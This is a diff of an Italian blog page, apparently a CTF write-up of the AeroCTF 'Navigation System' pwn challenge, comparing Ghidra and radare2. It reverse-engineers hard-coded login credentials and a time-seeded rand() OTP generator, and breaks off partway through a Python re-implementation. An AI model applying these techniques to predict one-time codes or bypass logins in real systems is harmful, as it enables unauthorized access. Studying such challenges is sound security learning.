@@ -1,84 +1,11 @@
-<!DOCTYPE html>
-<html lang="it-it">
-<head>
-<meta charset="utf-8">
-<meta name="description" content="">
-<meta name="generator" content="Hugo 0.54.0" />
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="/css/style.css" type="text/css">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css" disabled>
-<link rel="alternate" href="/index.xml" type="application/rss+xml" title="R13">
-<title>Aeroctf CTF - Navigation System - R13</title>
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-130188859-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-130188859-1');
-</script>
-</head>
-<body>
-
-<header>
-  <div class="container clearfix">
-    <span class="base05">[</span><span class="base08">R</span><span class="base09">A</span><span class="base0a">D</span><span class="base0b">-</span><span class="base0c">1</span><span class="base0d">3</span><span class="base05">]</span>
-    <span class="base05"># <a class="path" href=https://rad-13.github.io/> home</a>/posts/navigation-system/</span>
-    <div class="right">
-      
-    </div>
-  </div>
-</header>
-
-<div class="container">
-
-
-<main role="main" class="article">
-  
-<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
-  <div class="meta">
-
-    <span class="key">published on</span>
-    <span class="val"><time itemprop="datePublished" datetime="2019-03-09">March 09, 2019</time></span>
-
-
-    <span class="key">in</span>
-    <span class="val">
-
-        <a href="/categories/ctf">ctf</a>
-
-    </span>
-
-
-    <br>
-    <span class="key">tags:</span>
-    <span class="val">
-
-        <a href="/tags/aeroctf">aeroctf</a>
-
-        <a href="/tags/pwn">pwn</a>
-
-    </span>
-
-  </div>
-  <h1 class="headline" itemprop="headline">Aeroctf CTF - Navigation System</h1>
-  <section class="body" itemprop="articleBody">
-    <script src="https://unpkg.com/vanilla-back-to-top@7.2.0/dist/vanilla-back-to-top.min.js"></script>
-    <script>addBackToTop({
-        diameter: 56,
-        backgroundColor: 'rgb(255, 204, 102);',
-        textColor: '#f2f0ec'
-      })</script>
-    <p><strong>Navigation System</strong> è la prima sfida della sezione pwning della <a href="https://ctftime.org/event/772">Aero CTF</a>.</p>
-
-<p>L&rsquo;idea di questo writeup non è prettamente quello di spiegare nel dettaglio le falle presenti nella sfida, ma piuttosto valutare come il software <a href="https://ghidra-sre.org/">Ghidra</a> performa in un contesto come le CTF, e confrontarlo al classico <a href="https://rada.re/">radare2</a>.</p>
-
-<p>Per una spiegazione più approfondita di come ho sfruttato le vulnerabilità del binario al fine di ottenere la flag si può fare riferimento alla <a href="/posts/casino/">seguente sfida</a>, abbastanza analoga.</p>
-
-<p>Il binario utilizzato è il seguente: <a href="/files/ns" download>Download</a></p>
-
-<p>Prima di eseguire il binario analizziamo il programma con <a href="https://r2wiki.readthedocs.io/en/latest/tools/rabin2/">rabin2</a> con cui possiamo dare un&rsquo;occhiata alle caratteristiche principali dell&rsquo;eseguibile.</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">arch     x86
+<!doctype html><html lang=it-it><head><meta charset=utf-8><meta name=description content><meta name=generator content="Hugo 0.54.0"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/css/style.css type=text/css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type=text/css disabled><link rel=alternate href=/index.xml type=application/rss+xml title=R13><title>Aeroctf CTF - Navigation System - R13</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-130188859-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
+gtag('js',new Date());gtag('config','UA-130188859-1');</script></head><body><header><div class="container clearfix"><span class=base05>[</span><span class=base08>R</span><span class=base09>A</span><span class=base0a>D</span><span class=base0b>-</span><span class=base0c>1</span><span class=base0d>3</span><span class=base05>]</span>
+<span class=base05># <a class=path href=https://rad-13.github.io/>home</a>/posts/navigation-system/</span><div class=right></div></div></header><div class=container><main role=main class=article><article class=single itemscope itemtype=http://schema.org/BlogPosting><div class=meta><span class=key>published on</span>
+<span class=val><time itemprop=datePublished datetime=2019-03-09>March 09, 2019</time></span>
+<span class=key>in</span>
+<span class=val><a href=/categories/ctf>ctf</a></span><br><span class=key>tags:</span>
+<span class=val><a href=/tags/aeroctf>aeroctf</a>
+<a href=/tags/pwn>pwn</a></span></div><h1 class=headline itemprop=headline>Aeroctf CTF - Navigation System</h1><section class=body itemprop=articleBody><script src=https://unpkg.com/vanilla-back-to-top@7.2.0/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:56,backgroundColor:'rgb(255, 204, 102);',textColor:'#f2f0ec'})</script><p><strong>Navigation System</strong> è la prima sfida della sezione pwning della <a href=https://ctftime.org/event/772>Aero CTF</a>.</p><p>L&rsquo;idea di questo writeup non è prettamente quello di spiegare nel dettaglio le falle presenti nella sfida, ma piuttosto valutare come il software <a href=https://ghidra-sre.org/>Ghidra</a> performa in un contesto come le CTF, e confrontarlo al classico <a href=https://rada.re/>radare2</a>.</p><p>Per una spiegazione più approfondita di come ho sfruttato le vulnerabilità del binario al fine di ottenere la flag si può fare riferimento alla <a href=/posts/casino/>seguente sfida</a>, abbastanza analoga.</p><p>Il binario utilizzato è il seguente: <a href=/files/ns download>Download</a></p><p>Prima di eseguire il binario analizziamo il programma con <a href=https://r2wiki.readthedocs.io/en/latest/tools/rabin2/>rabin2</a> con cui possiamo dare un&rsquo;occhiata alle caratteristiche principali dell&rsquo;eseguibile.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>arch     x86
 baddr    0x8048000
 binsz    14867
 bintype  elf
@@ -107,311 +34,224 @@ rpath    NONE
 static   false
 stripped false
 subsys   linux
-va       true</code></pre></div>
-<p>Possiamo notare alcune caratteristiche di base, ad esempio l&rsquo;eseguibile è un ELF32, l&rsquo;architettura è x86 e naturalmente è a 32 bit little endian.</p>
-
-<p>A livello di protezione notiamo invece che il RELRO è parziale (come di default per gcc), nx a true (default) e canary a true (non default), in pratica è barricato, date tali informazioni si può escludere fin da subito un attacco di tipo buffer overflow.</p>
-
-<p>L&rsquo;equivalente ci viene mostrato da ghidra una volta importato l&rsquo;eseguibile all&rsquo;interno di un progetto:
-<figure>
-    <img src="/img/aeroctf-ns-ghidra-binaryinfo.png"/> <figcaption>
-            <h4>Informazioni del binario secondo Ghidra</h4>
-        </figcaption>
-</figure>
-
-È possibile notare fin da subito che molte delle informazioni mostrate da rabin qui mancano.</p>
-
-<p>Eseguito il programma ci viene chiesto un username ed una password:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">--------- Navigation System Monitor ---------
+va       true</code></pre></div><p>Possiamo notare alcune caratteristiche di base, ad esempio l&rsquo;eseguibile è un ELF32, l&rsquo;architettura è x86 e naturalmente è a 32 bit little endian.</p><p>A livello di protezione notiamo invece che il RELRO è parziale (come di default per gcc), nx a true (default) e canary a true (non default), in pratica è barricato, date tali informazioni si può escludere fin da subito un attacco di tipo buffer overflow.</p><p>L&rsquo;equivalente ci viene mostrato da ghidra una volta importato l&rsquo;eseguibile all&rsquo;interno di un progetto:<figure><img src=/img/aeroctf-ns-ghidra-binaryinfo.png><figcaption><h4>Informazioni del binario secondo Ghidra</h4></figcaption></figure>È possibile notare fin da subito che molte delle informazioni mostrate da rabin qui mancano.</p><p>Eseguito il programma ci viene chiesto un username ed una password:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>--------- Navigation System Monitor ---------
 Please authorization on system
 Login: username
 Password: password
-Username is invalid!</code></pre></div>
-<p>Tramite radare2 possiamo vedere la struttura del programma e ricavare tali informazioni:</p>
-<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mh">0x4c</span><span class="p">]</span>
-<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>                 
-<span class="nf">push</span> <span class="nb">eax</span>                   
-<span class="nf">lea</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nv">var_3eh</span><span class="p">]</span>         
-<span class="nf">push</span> <span class="nb">eax</span>                   
-<span class="nf">call</span> <span class="nv">sym.imp.strcmp</span>        </code></pre></div>
-<p>questa parte di codice viene eseguita due volte, la prima volta per l&rsquo;username la seconda volta per la password. Nel caso appena mostrato <code>var_3eh</code> è appunto il valore appena inserito tramite una scanf e <code>dword [ebx + 0x4c]</code> rappresenta invece dove effettivamente si trova l&rsquo;username/password richiesto.</p>
-
-<p>In Ghidra ci viene mostrata qualche informazione aggiuntiva:</p>
-<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">MOV</span>  <span class="nb">EAX</span><span class="p">,</span><span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">offset</span> <span class="nv">valid_login</span> <span class="o">+</span> <span class="nb">EBX</span><span class="p">]</span> <span class="err">=</span> <span class="mi">0804</span><span class="nv">a008</span>
-<span class="nf">SUB</span>  <span class="nb">ESP</span><span class="p">,</span><span class="mh">0x8</span>
-<span class="nf">PUSH</span> <span class="nb">EAX</span><span class="err">=</span><span class="o">&gt;</span><span class="nv">s_test_account_0804a008</span> <span class="err">=</span> <span class="s">&#34;test_account&#34;</span>
-<span class="nf">LEA</span>  <span class="nb">EAX</span><span class="err">=</span><span class="o">&gt;</span><span class="nv">local_46</span><span class="p">,[</span><span class="nb">EBP</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x3e</span><span class="p">]</span>
-<span class="nf">PUSH</span> <span class="nb">EAX</span>
-<span class="nf">CALL</span> <span class="nv">strcmp</span></code></pre></div>
-<p>si ricavano dunque le due informazioni richieste per proseguire, il nuovo output dal programma è:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">--------- Navigation System Monitor ---------
+Username is invalid!</code></pre></div><p>Tramite radare2 possiamo vedere la struttura del programma e ricavare tali informazioni:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>ebx</span> <span class=o>+</span> <span class=mh>0x4c</span><span class=p>]</span>
+<span class=nf>sub</span> <span class=nb>esp</span><span class=p>,</span> <span class=mi>8</span>                 
+<span class=nf>push</span> <span class=nb>eax</span>                   
+<span class=nf>lea</span> <span class=nb>eax</span><span class=p>,</span> <span class=p>[</span><span class=nv>var_3eh</span><span class=p>]</span>         
+<span class=nf>push</span> <span class=nb>eax</span>                   
+<span class=nf>call</span> <span class=nv>sym.imp.strcmp</span>        </code></pre></div><p>questa parte di codice viene eseguita due volte, la prima volta per l&rsquo;username la seconda volta per la password. Nel caso appena mostrato <code>var_3eh</code> è appunto il valore appena inserito tramite una scanf e <code>dword [ebx + 0x4c]</code> rappresenta invece dove effettivamente si trova l&rsquo;username/password richiesto.</p><p>In Ghidra ci viene mostrata qualche informazione aggiuntiva:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=nf>MOV</span>  <span class=nb>EAX</span><span class=p>,</span><span class=kt>dword</span> <span class=nv>ptr</span> <span class=p>[</span><span class=nv>offset</span> <span class=nv>valid_login</span> <span class=o>+</span> <span class=nb>EBX</span><span class=p>]</span> <span class=err>=</span> <span class=mi>0804</span><span class=nv>a008</span>
+<span class=nf>SUB</span>  <span class=nb>ESP</span><span class=p>,</span><span class=mh>0x8</span>
+<span class=nf>PUSH</span> <span class=nb>EAX</span><span class=err>=</span><span class=o>&gt;</span><span class=nv>s_test_account_0804a008</span> <span class=err>=</span> <span class=s>&#34;test_account&#34;</span>
+<span class=nf>LEA</span>  <span class=nb>EAX</span><span class=err>=</span><span class=o>&gt;</span><span class=nv>local_46</span><span class=p>,[</span><span class=nb>EBP</span> <span class=o>+</span> <span class=o>-</span><span class=mh>0x3e</span><span class=p>]</span>
+<span class=nf>PUSH</span> <span class=nb>EAX</span>
+<span class=nf>CALL</span> <span class=nv>strcmp</span></code></pre></div><p>si ricavano dunque le due informazioni richieste per proseguire, il nuovo output dal programma è:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>--------- Navigation System Monitor ---------
 Please authorization on system
 Login: test_account
 Password: test_password
 Enter the OTP code: AAAAAAAAAAAA
-OTP is incorrect!</code></pre></div>
-<p>Ci viene richiesto un codice OTP, tale codice viene generato dalla funzione <em>genOTPcode</em> che viene così mostrata da radare2:</p>
-<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">push</span> <span class="nb">ebp</span>   
-<span class="nf">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>   
-<span class="nf">push</span> <span class="nb">ebx</span>   
-<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x14</span>   
-<span class="nf">call</span> <span class="nv">sym.__x86.get_pc_thunk.bx</span> <span class="c1">;[1]</span>
-<span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x2bd4</span>   
-<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0xc</span>   
-<span class="nf">push</span> <span class="mi">0</span>   
-<span class="nf">call</span> <span class="nv">sym.imp.time</span>  <span class="c1">;[2] ; time_t time(time_t *timer)</span>
-<span class="nf">add</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x10</span>   
-<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_10h</span><span class="p">],</span> <span class="nb">eax</span>   
-<span class="nf">movzx</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>   
-<span class="nf">movsx</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">al</span>   
-<span class="nf">add</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_10h</span><span class="p">],</span> <span class="nb">eax</span>   
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">arg_ch</span><span class="p">]</span> <span class="c1">; [0xc:4]=-1 ; 12</span>
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">arg_8h</span><span class="p">]</span> <span class="c1">; [0x8:4]=-1 ; 8</span>
-<span class="nf">movzx</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>   
-<span class="nf">movsx</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">al</span>   
-<span class="nf">add</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_10h</span><span class="p">],</span> <span class="nb">eax</span>   
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_10h</span><span class="p">]</span>   
-<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0xc</span>   
-<span class="nf">push</span> <span class="nb">eax</span>   
-<span class="nf">call</span> <span class="nv">sym.imp.srand</span> <span class="c1">;[3] ; void srand(int seed)</span>
-<span class="nf">add</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x10</span>   
-<span class="nf">call</span> <span class="nv">sym.imp.rand</span> <span class="c1">;[4] ; int rand(void)</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>   
-<span class="nf">cmp</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span>   
-<span class="nf">setae</span> <span class="nb">al</span>   
-<span class="nf">movzx</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">al</span>   
-<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_ch</span><span class="p">],</span> <span class="nb">eax</span>   
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_ch</span><span class="p">]</span>   
-<span class="nf">neg</span> <span class="nb">eax</span>   
-<span class="nf">sub</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>   
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>   
-<span class="nf">mov</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_ch</span><span class="p">],</span> <span class="nb">eax</span>   
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_ch</span><span class="p">]</span>   
-<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="kt">dword</span> <span class="p">[</span><span class="nv">var_4h</span><span class="p">]</span>   
-<span class="nf">leave</span>   
-<span class="nf">ret</span></code></pre></div>
-<p>Tale funzione genera semplicemente un numero randomico, appunto il nostro codice OTP, la falla sta nel fatto che è possibile predire il numero generato conoscendo l&rsquo;algoritmo con cui si genera il seed e la versione di glibc usata.</p>
+OTP is incorrect!</code></pre></div><p>Ci viene richiesto un codice OTP, tale codice viene generato dalla funzione <em>genOTPcode</em> che viene così mostrata da radare2:</p><div class=highlight><pre class=chroma><code class=language-nasm data-lang=nasm><span class=nf>push</span> <span class=nb>ebp</span>   
+<span class=nf>mov</span> <span class=nb>ebp</span><span class=p>,</span> <span class=nb>esp</span>   
+<span class=nf>push</span> <span class=nb>ebx</span>   
+<span class=nf>sub</span> <span class=nb>esp</span><span class=p>,</span> <span class=mh>0x14</span>   
+<span class=nf>call</span> <span class=nv>sym.__x86.get_pc_thunk.bx</span> <span class=c1>;[1]</span>
+<span class=nf>add</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x2bd4</span>   
+<span class=nf>sub</span> <span class=nb>esp</span><span class=p>,</span> <span class=mh>0xc</span>   
+<span class=nf>push</span> <span class=mi>0</span>   
+<span class=nf>call</span> <span class=nv>sym.imp.time</span>  <span class=c1>;[2] ; time_t time(time_t *timer)</span>
+<span class=nf>add</span> <span class=nb>esp</span><span class=p>,</span> <span class=mh>0x10</span>   
+<span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_10h</span><span class=p>],</span> <span class=nb>eax</span>   
+<span class=nf>movzx</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>byte</span> <span class=p>[</span><span class=nb>eax</span><span class=p>]</span>   
+<span class=nf>movsx</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>al</span>   
+<span class=nf>add</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_10h</span><span class=p>],</span> <span class=nb>eax</span>   
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>arg_ch</span><span class=p>]</span> <span class=c1>; [0xc:4]=-1 ; 12</span>
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>arg_8h</span><span class=p>]</span> <span class=c1>; [0x8:4]=-1 ; 8</span>
+<span class=nf>movzx</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>byte</span> <span class=p>[</span><span class=nb>eax</span><span class=p>]</span>   
+<span class=nf>movsx</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>al</span>   
+<span class=nf>add</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_10h</span><span class=p>],</span> <span class=nb>eax</span>   
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_10h</span><span class=p>]</span>   
+<span class=nf>sub</span> <span class=nb>esp</span><span class=p>,</span> <span class=mh>0xc</span>   
+<span class=nf>push</span> <span class=nb>eax</span>   
+<span class=nf>call</span> <span class=nv>sym.imp.srand</span> <span class=c1>;[3] ; void srand(int seed)</span>
+<span class=nf>add</span> <span class=nb>esp</span><span class=p>,</span> <span class=mh>0x10</span>   
+<span class=nf>call</span> <span class=nv>sym.imp.rand</span> <span class=c1>;[4] ; int rand(void)</span>
+<span class=nf>mov</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>eax</span>   
+<span class=nf>cmp</span> <span class=nb>edx</span><span class=p>,</span> <span class=mh>0xffffffffffffffff</span>   
+<span class=nf>setae</span> <span class=nb>al</span>   
+<span class=nf>movzx</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>al</span>   
+<span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_ch</span><span class=p>],</span> <span class=nb>eax</span>   
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_ch</span><span class=p>]</span>   
+<span class=nf>neg</span> <span class=nb>eax</span>   
+<span class=nf>sub</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>eax</span>   
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>edx</span>   
+<span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_ch</span><span class=p>],</span> <span class=nb>eax</span>   
+<span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_ch</span><span class=p>]</span>   
+<span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=kt>dword</span> <span class=p>[</span><span class=nv>var_4h</span><span class=p>]</span>   
+<span class=nf>leave</span>   
+<span class=nf>ret</span></code></pre></div><p>Tale funzione genera semplicemente un numero randomico, appunto il nostro codice OTP, la falla sta nel fatto che è possibile predire il numero generato conoscendo l&rsquo;algoritmo con cui si genera il seed e la versione di glibc usata.</p><p>Mentre radare2 non ci ha dato informazioni riguardo quest&rsquo;ultima Ghidra ci informa che la glibc usata è la <em>libc.so.6</em>.</p><p>Come è possibile desumere dai 112 byte di cui tale funzione è composta capirne il funzionamento non è immediato, radare2 ci fornisce il seguente pseudocodice:</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=n>function</span> <span class=n>sym</span><span class=p>.</span><span class=n>genOTPcode</span> <span class=p>()</span> <span class=p>{</span>                              
+  <span class=c1>//  1 basic blocks                                                                                
+</span><span class=c1></span>  <span class=nl>loc_0x8049420</span><span class=p>:</span>                                                                                      
+     <span class=c1>//CALL XREF from sym.main (0x8049318)              
+</span><span class=c1></span>     <span class=n>push</span> <span class=n>ebp</span>                                           
+     <span class=n>ebp</span> <span class=o>=</span> <span class=n>esp</span>                                          
+     <span class=n>push</span> <span class=n>ebx</span>                                           
+     <span class=n>esp</span> <span class=o>-=</span> <span class=mh>0x14</span>                                        
+     <span class=n>sym</span><span class=p>.</span><span class=n>__x86</span><span class=p>.</span><span class=n>get_pc_thunk</span><span class=p>.</span><span class=n>bx</span> <span class=p>()</span> <span class=p>;[</span><span class=mi>1</span><span class=p>]</span>                  
+     <span class=n>ebx</span> <span class=o>+=</span> <span class=mh>0x2bd4</span>            <span class=c1>//obj._GLOBAL_OFFSET_TABLE
+</span><span class=c1></span>     <span class=n>esp</span> <span class=o>-=</span> <span class=mh>0xc</span>                                         
+     <span class=n>push</span> <span class=mi>0</span>                                             
+     <span class=n>time_t</span> <span class=n>time</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>           <span class=p>;[</span><span class=mi>2</span><span class=p>]</span>                      
+                             <span class=c1>//sym.imp.time ()          
+</span><span class=c1></span>     <span class=n>esp</span> <span class=o>+=</span> <span class=mh>0x10</span>                                        
+     <span class=n>dword</span> <span class=p>[</span><span class=n>var_10h</span><span class=p>]</span> <span class=o>=</span> <span class=n>eax</span>                              
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>arg_8h</span><span class=p>]</span>     <span class=c1>//[0x8:4]=-1 ; 8          
+</span><span class=c1></span>     <span class=n>eax</span> <span class=o>=</span> <span class=n>byte</span> <span class=p>[</span><span class=n>eax</span><span class=p>]</span>                                   
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>al</span>                                           
+     <span class=n>dword</span> <span class=p>[</span><span class=n>var_10h</span><span class=p>]</span> <span class=o>+=</span> <span class=n>eax</span>                             
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>arg_ch</span><span class=p>]</span>     <span class=c1>//[0xc:4]=-1 ; 12         
+</span><span class=c1></span>     <span class=n>eax</span> <span class=o>=</span> <span class=n>byte</span> <span class=p>[</span><span class=n>eax</span><span class=p>]</span>                                   
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>al</span>                                           
+     <span class=n>dword</span> <span class=p>[</span><span class=n>var_10h</span><span class=p>]</span> <span class=o>+=</span> <span class=n>eax</span>                             
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>var_10h</span><span class=p>]</span>                              
+     <span class=n>esp</span> <span class=o>-=</span> <span class=mh>0xc</span>                                         
+     <span class=n>push</span> <span class=n>eax</span>                                           
+     <span class=kt>void</span> <span class=n>srand</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>           <span class=p>;[</span><span class=mi>3</span><span class=p>]</span>                      
+                            <span class=c1>//sym.imp.srand ()          
+</span><span class=c1></span>     <span class=n>esp</span> <span class=o>+=</span> <span class=mh>0x10</span>                                        
+     <span class=kt>int</span> <span class=n>rand</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>           <span class=p>;[</span><span class=mi>4</span><span class=p>]</span>                      
+                             <span class=c1>//sym.imp.rand ()          
+</span><span class=c1></span>     <span class=n>edx</span> <span class=o>=</span> <span class=n>eax</span>                                          
+     <span class=n>var</span> <span class=o>=</span> <span class=n>edx</span> <span class=o>-</span> <span class=mh>0xffffffffffffffff</span>                     
+     <span class=n>setae</span> <span class=n>al</span>                                           
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>al</span>                                           
+     <span class=n>dword</span> <span class=p>[</span><span class=n>var_ch</span><span class=p>]</span> <span class=o>=</span> <span class=n>eax</span>                               
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>var_ch</span><span class=p>]</span>                               
+     <span class=n>eax</span> <span class=o>~=</span> <span class=n>eax</span>                                         
+     <span class=n>edx</span> <span class=o>-=</span> <span class=n>eax</span>                                         
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>edx</span>                                          
+     <span class=n>dword</span> <span class=p>[</span><span class=n>var_ch</span><span class=p>]</span> <span class=o>=</span> <span class=n>eax</span>                               
+     <span class=n>eax</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>var_ch</span><span class=p>]</span>                               
+     <span class=n>ebx</span> <span class=o>=</span> <span class=n>dword</span> <span class=p>[</span><span class=n>var_4h</span><span class=p>]</span>                               
+     <span class=n>leave</span> <span class=c1>//ebp ; ebp
+</span><span class=c1></span><span class=p>}</span></code></pre></div><p>Che detto chiaramente è utile quanto non averlo.</p><p>Ghidra invece traduce il tutto nel seguente pseudocodice (si noti che non ho modificato nulla):</p><div class=highlight><pre class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>genOTPcode</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>param_1</span><span class=p>,</span><span class=kt>char</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>
+<span class=p>{</span>
+  <span class=n>time_t</span> <span class=n>tVar1</span><span class=p>;</span>
+  <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
 
-<p>Mentre radare2 non ci ha dato informazioni riguardo quest&rsquo;ultima Ghidra ci informa che la glibc usata è la <em>libc.so.6</em>.</p>
+  <span class=n>tVar1</span> <span class=o>=</span> <span class=n>time</span><span class=p>((</span><span class=n>time_t</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
+  <span class=n>srand</span><span class=p>(</span><span class=n>tVar1</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=o>*</span><span class=n>param_1</span> <span class=o>+</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=o>*</span><span class=n>param_2</span><span class=p>);</span>
+  <span class=n>iVar2</span> <span class=o>=</span> <span class=n>rand</span><span class=p>();</span>
+  <span class=k>return</span> <span class=n>iVar2</span> <span class=o>+</span> <span class=p>(</span><span class=n>uint</span><span class=p>)(</span><span class=n>iVar2</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+<span class=p>}</span></code></pre></div><p>Ho quindi tradotto letteralmente in python il tutto:</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=k>def</span> <span class=nf>genOTPcode</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>):</span>
+  <span class=n>tVar1</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
 
-<p>Come è possibile desumere dai 112 byte di cui tale funzione è composta capirne il funzionamento non è immediato, radare2 ci fornisce il seguente pseudocodice:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">function</span> <span class="n">sym</span><span class="p">.</span><span class="n">genOTPcode</span> <span class="p">()</span> <span class="p">{</span>                              
-  <span class="c1">//  1 basic blocks                                                                                
-</span><span class="c1"></span>  <span class="nl">loc_0x8049420</span><span class="p">:</span>                                                                                      
-     <span class="c1">//CALL XREF from sym.main (0x8049318)              
-</span><span class="c1"></span>     <span class="n">push</span> <span class="n">ebp</span>                                           
-     <span class="n">ebp</span> <span class="o">=</span> <span class="n">esp</span>                                          
